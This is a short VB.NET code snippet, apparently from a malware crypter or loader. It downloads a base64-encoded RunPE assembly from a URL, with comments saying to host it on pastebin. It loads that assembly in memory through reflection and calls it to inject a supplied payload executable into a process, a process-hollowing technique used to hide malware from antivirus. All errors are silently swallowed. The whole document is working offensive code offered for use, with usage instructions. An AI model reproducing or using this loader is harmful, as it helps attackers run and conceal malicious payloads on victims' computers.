  'Upload RunPE to pastebin and replace the URL
  'Usage :
  
  'Dim Payload As Byte() = IO.Files.ReadAllBytes("C:\YourPayload.exe")
  'Dim Payload As Byte() = My.Resources.YourPayload
  '
  'Load(Payload)


  Public Sub Load(ByVal Payload As Byte())
        Try
        Assembly.Load(Convert(Download("http://127.0.0.1/RunPE.txt"))).GetType("RunPE.RunPE").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {Application.ExecutablePath, Nothing, Payload, True})
        Catch
        End Try
  End Sub
    
    Public Function Download(ByVal url As String) As String
        Try
            Dim WC As New WebClient
            Return WC.DownloadString(url)
        Catch
        End Try
    End Function


    Public Function Convert(ByVal data As String) As Byte()
        Try
            Return Convert.FromBase64String(data)
        Catch
        End Try
    End Function
